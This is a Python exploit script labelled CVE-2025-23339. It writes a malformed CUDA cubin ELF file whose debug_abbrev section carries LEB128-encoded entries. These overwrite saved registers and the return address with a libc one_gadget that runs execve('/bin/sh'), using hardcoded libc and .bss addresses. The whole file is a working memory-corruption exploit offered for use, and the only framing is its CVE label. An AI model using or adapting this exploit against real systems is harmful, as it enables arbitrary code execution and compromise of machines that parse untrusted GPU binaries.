#!/usr/bin/env python3
"""
CVE-2025-23339 - One Gadget v2

Fix: Can't use 0 values due to LEB128 parsing.
Use small values that point to valid/writable memory.

one_gadget 0xef4ce:
  execve("/bin/sh", rbp-0x50, r12)
  constraints:
    - rbp-0x48 is writable
    - rbx == NULL || valid argv  
    - r12 == NULL || valid envp
"""

import struct
import sys

def encode_leb128(value):
    result = []
    while True:
        byte = value & 0x7f
        value >>= 7
        if value != 0:
            byte |= 0x80
        result.append(byte)
        if value == 0:
            break
    return bytes(result)

def build_cubin(content):
    strtab = b'\x00.shstrtab\x00.debug_abbrev\x00'
    ehdr_size, shnum = 64, 3
    shoff = ehdr_size
    strtab_off = shoff + shnum * 64
    debug_off = strtab_off + len(strtab)
    pad = (4 - (debug_off % 4)) % 4
    debug_off += pad
    
    elf = bytearray(64)
    elf[0:4] = b'\x7fELF'
    elf[4:8] = bytes([2, 1, 1, 7])
    struct.pack_into('<H', elf, 16, 0x3142)
    struct.pack_into('<H', elf, 18, 0xbe)
    struct.pack_into('<I', elf, 20, 1)
    struct.pack_into('<Q', elf, 40, shoff)
    struct.pack_into('<I', elf, 48, 0x340534)
    struct.pack_into('<H', elf, 52, 64)
    struct.pack_into('<H', elf, 58, 64)
    struct.pack_into('<H', elf, 60, shnum)
    struct.pack_into('<H', elf, 62, 1)
    
    sh_null = bytes(64)
    sh_str = bytearray(64)
    struct.pack_into('<I', sh_str, 0, 1)
    struct.pack_into('<I', sh_str, 4, 3)
    struct.pack_into('<Q', sh_str, 24, strtab_off)
    struct.pack_into('<Q', sh_str, 32, len(strtab))
    struct.pack_into('<Q', sh_str, 48, 1)
    
    sh_dbg = bytearray(64)
    struct.pack_into('<I', sh_dbg, 0, 11)
    struct.pack_into('<I', sh_dbg, 4, 1)
    struct.pack_into('<Q', sh_dbg, 24, debug_off)
    struct.pack_into('<Q', sh_dbg, 32, len(content))
    struct.pack_into('<Q', sh_dbg, 48, 4)
    
    return bytes(elf + sh_null + sh_str + sh_dbg + strtab + bytes(pad) + content)

def build_payload(entries):
    p = bytearray()
    p += encode_leb128(4) + encode_leb128(0x33) + bytes([1])
    
    for low, high in entries:
        p += encode_leb128(low)
        p += encode_leb128(high)
    
    p += bytes([0, 0, 0])
    return bytes(p)

output = sys.argv[1] if len(sys.argv) > 1 else "exploit.cubin"

libc_base = 0x7ffff7c00000
one_gadget = libc_base + 0xef4ce  # execve("/bin/sh", rbp-0x50, r12)

# Writable addresses in binary
bss = 0x68a000

entries = []

# Padding - use (1, 1) to avoid zero issues
for i in range(0x101):
    entries.append((1, 1))

# Saved registers layout after pop sequence:
# pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15, ret

# Entry 0x101: saved rbx - need NULL or valid argv
# Try pointing to memory with NULL at start
entries.append((bss, 0))

# Entry 0x102: saved rbp - rbp-0x48 must be writable
# Point to middle of .bss so rbp-0x48 is still valid
entries.append((bss + 0x100, 0))

# Entry 0x103: saved r12 - need NULL or valid envp
# Point to memory containing NULL
entries.append((bss, 0))

# Entry 0x104: saved r13
entries.append((1, 0))

# Entry 0x105: saved r14
entries.append((1, 0))

# Entry 0x106: saved r15
entries.append((1, 0))

# Entry 0x107: return address -> one_gadget
entries.append((one_gadget & 0xFFFFFFFF, one_gadget >> 32))

print(f"[*] CVE-2025-23339 One-Gadget Exploit v2")
print(f"[*] libc base: 0x{libc_base:x}")  
print(f"[*] one_gadget: 0x{one_gadget:x}")
print(f"[*] .bss: 0x{bss:x}")
print(f"[*] Total entries: {len(entries)}")

payload = build_payload(entries)
elf = build_cubin(payload)

with open(output, 'wb') as f:
    f.write(elf)

print(f"[+] Written: {output}")
